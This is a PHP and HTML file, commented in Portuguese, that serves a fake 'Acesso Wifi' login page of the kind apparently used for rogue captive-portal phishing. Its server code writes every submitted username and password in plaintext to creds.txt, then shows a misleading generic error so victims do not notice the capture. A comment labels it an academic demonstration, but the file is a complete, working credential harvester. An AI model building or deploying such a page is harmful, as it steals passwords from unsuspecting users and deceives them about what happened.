<?php
// Configurações de segurança
session_start();

$mensagem = "";

// Processa os dados recebidos via POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Recebe e valida os campos
    $usuario = $_POST["usuario"] ?? "";
    $senha = $_POST["senha"] ?? "";

    if ($usuario === "" || $senha === "") {
        $mensagem = "Erro ao processar requisição, tente novamente mais tarde";

    } elseif (
        strlen($usuario) > 50 ||
        strlen($senha) > 100
    ) {
        $mensagem = "Erro ao processar requisição, tente novamente mais tarde";

    } elseif (
        preg_match('/[\r\n]/', $usuario) ||
        preg_match('/[\r\n]/', $senha)
    ) {
        $mensagem = "Erro ao processar requisição, tente novamente mais tarde";

    } else {

        // Armazenamento conforme solicitado no trabalho
        // ATENÇÃO: somente para demonstração acadêmica.
        $linha = $usuario . " - " . $senha . PHP_EOL;

        $arquivo = "creds.txt";

        // Gravação com bloqueio para evitar conflitos simultâneos
        file_put_contents(
            $arquivo,
            $linha,
            FILE_APPEND | LOCK_EX
        );

        $mensagem = "Erro ao processar requisição, tente novamente mais tarde";
    }
}
?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Acesso Wifi</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #e5e7eb;
            min-height: 100vh;

            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: #ffffff;
            width: 90%;
            max-width: 400px;

            padding: 40px 35px;

            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);

            text-align: center;
        }

        h1 {
            color: #374151;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .subtitulo {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .campo {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #4b5563;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 12px;

            border: 1px solid #d1d5db;
            border-radius: 6px;

            font-size: 15px;
            outline: none;
        }

        input:focus {
            border-color: #6b7280;
            box-shadow: 0 0 0 2px rgba(107, 114, 128, 0.15);
        }

        button {
            width: 100%;
            padding: 13px;

            background: #4b5563;
            color: #ffffff;

            border: none;
            border-radius: 6px;

            font-size: 16px;
            font-weight: bold;

            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #374151;
        }

        .mensagem {
            margin-top: 20px;
            padding: 12px;

            background: #f3f4f6;
            color: #374151;

            border-radius: 6px;
            font-size: 14px;
        }

        .rodape {
            margin-top: 25px;
            color: #9ca3af;
            font-size: 12px;
        }
    </style>
</head>

<body>

    <div class="container">

        <h1>Acesso Wifi</h1>

        <p class="subtitulo">
            Informe suas credenciais para continuar
        </p>

        <form method="POST" action="">

            <div class="campo">
                <label for="usuario">Usuário</label>

                <input
                    type="text"
                    id="usuario"
                    name="usuario"
                    maxlength="50"
                    autocomplete="username"
                    required
                >
            </div>

            <div class="campo">
                <label for="senha">Senha</label>

                <input
                    type="password"
                    id="senha"
                    name="senha"
                    maxlength="100"
                    autocomplete="current-password"
                    required
                >
            </div>

            <button type="submit">
                Entrar
            </button>

        </form>

        <?php if ($mensagem !== ""): ?>
            <div class="mensagem">
                <?= $mensagem ?>
            </div>
        <?php endif; ?>

        <div class="rodape">
            Sistema de acesso Wi-Fi
        </div>

    </div>

</body>
</html>
